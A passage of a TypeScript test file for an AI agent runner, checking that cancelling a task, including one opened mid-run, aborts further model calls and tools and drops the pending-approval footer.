    const out = await runAgent({ route: route(CTO), task, history: [] }, s.deps);
    expect(ran).toEqual(['a']);
    expect(out.stopped).toBe('cancelled');
    expect(p.calls).toHaveLength(1); // no second provider call
  });

  // G2-03: a conversation task opened part-way through the run (task null at the start) is tracked and checked like a task the run started with.
  const midRun = async (second: 'hang' | 'text') => {
    const { z } = await import('zod');
    const s = await setup({ script: [] });
    let opened = '';
    s.deps.conversation = { open: async () => { const t = await owned(s.tasks, CTO); opened = t.id; return t; } } as never;
    s.deps.tools.register({ name: 'probe_open', description: 'opens', inputSchema: z.object({}).passthrough(), requiresApproval: () => false,
      run: async (_i, ctx) => { await ctx.ensureConversationTask?.(); if (second === 'text') s.taskRuns.abort([opened]); return { content: 'opened' }; } });
    s.deps.tools.register({ name: 'probe_b', description: 'b', inputSchema: z.object({}).passthrough(), requiresApproval: () => false, run: async () => ({ content: 'b' }) });
    const d = s.deps.prompts.get('heads/software')!;
    s.deps.prompts.set('heads/software', { ...d, meta: { ...d.meta, tools: [...d.meta.tools, 'probe_open', 'probe_b'] } });
    s.deps.org = await (await import('../test-helpers.js')).seededOrg({ prompts: s.deps.prompts });
    let n = 0;
    useProvider(s, {
      id: 'claude',
      async *chat(_req, signal) {
        if (n++ === 0) {
          yield { type: 'tool_use', id: 'tu1', name: 'probe_open', input: {} };
          if (second === 'text') yield { type: 'tool_use', id: 'tu2', name: 'probe_b', input: {} };
          yield { type: 'usage', inputTokens: 1, outputTokens: 1, cacheReadTokens: 0, cacheWriteTokens: 0 };
          yield { type: 'stop', reason: 'tool_use' };
          return;
        }
        await new Promise((r) => signal.addEventListener('abort', r, { once: true }));
        yield { type: 'stop', reason: 'aborted' };
      },
    });
    const run = runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    return { s, run, opened: () => opened, calls: () => n };
  };

  it('G2-03: a cancel of a conversation task opened mid-run aborts the model call that follows (tracked, so cancelled and not halted)', async () => {
    const { s, run, opened } = await midRun('hang');
    await vi.waitFor(() => expect(opened()).not.toBe(''));
    await vi.waitFor(() => expect(s.taskRuns.active(opened())).toBe(true));
    s.taskRuns.abort([opened()]);
    const out = await run;
    expect(out.stopped).toBe('cancelled');
    expect(out.payload).toMatchObject({ title: 'Task cancelled' });
    expect(s.taskRuns.active(opened())).toBe(false);
  });

  it('G2-03: a cancel of the task opened mid-run refuses the later tools of the batch and starts no further model call', async () => {
    const { run, calls } = await midRun('text');
    const out = await run;
    expect(out.stopped).toBe('cancelled');
    expect(calls()).toBe(1);
  });

  it('a cancelled run adds no pending-approval footer (the approvals it left were expired by the cancel), where a halted one is also quiet and a plain stop keeps it', async () => {
    const { z } = await import('zod');
    const ask = (s: Awaited<ReturnType<typeof setup>>) => s.deps.tools.register({ name: 'probe_ask', description: 'asks', inputSchema: z.object({}).passthrough(), requiresApproval: () => true, run: async () => ({ content: 'ran' }) });
    const run = async (end: ((s: Awaited<ReturnType<typeof setup>>, taskId: string) => void) | null) => {
      const s = await setup({ script: [] });
      ask(s);
      s.approvals.request.mockImplementation(async () => ({ id: 7 }) as never); // the card exists, the task stays doing: the run goes on
      const d = s.deps.prompts.get('heads/software')!;
      s.deps.prompts.set('heads/software', { ...d, meta: { ...d.meta, tools: [...d.meta.tools, 'probe_ask'] } });
      s.deps.org = await (await import('../test-helpers.js')).seededOrg({ prompts: s.deps.prompts });
      const task = await owned(s.tasks, CTO);
      let n = 0;
      useProvider(s, {
        id: 'claude',
        async *chat(_req, signal) {
          if (n++ === 0) {
            yield { type: 'tool_use', id: 'tu1', name: 'probe_ask', input: {} };
            yield { type: 'usage', inputTokens: 1, outputTokens: 1, cacheReadTokens: 0, cacheWriteTokens: 0 };
            yield { type: 'stop', reason: 'tool_use' };
            return;
          }
          if (!end) {
            yield { type: 'text', text: 'all done' };
            yield { type: 'usage', inputTokens: 1, outputTokens: 1, cacheReadTokens: 0, cacheWriteTokens: 0 };
            yield { type: 'stop', reason: 'end_turn' };
            return;
          }
          await new Promise((r) => signal.addEventListener('abort', r, { once: true }));
          yield { type: 'stop', reason: 'aborted' };
        },
      });
      const p = runAgent({ route: route(CTO), task, history: [] }, s.deps);
      if (end) {
        await vi.waitFor(() => expect(s.taskRuns.active(task.id)).toBe(true));
        end(s, task.id);
      }
      return p;
    };
    const plain = await run(null);
    expect(plain.payload.body).toContain('probe_ask'); // the pending-approval footer exists for an ordinary stop
    const cancelled = await run((s, id) => void s.taskRuns.abort([id]));
    expect(cancelled.stopped).toBe('cancelled');
    expect(cancelled.payload.body).not.toContain('probe_ask');
    expect(cancelled.payload.body).toBe('This task was cancelled. Nothing more will run.');
  });
});
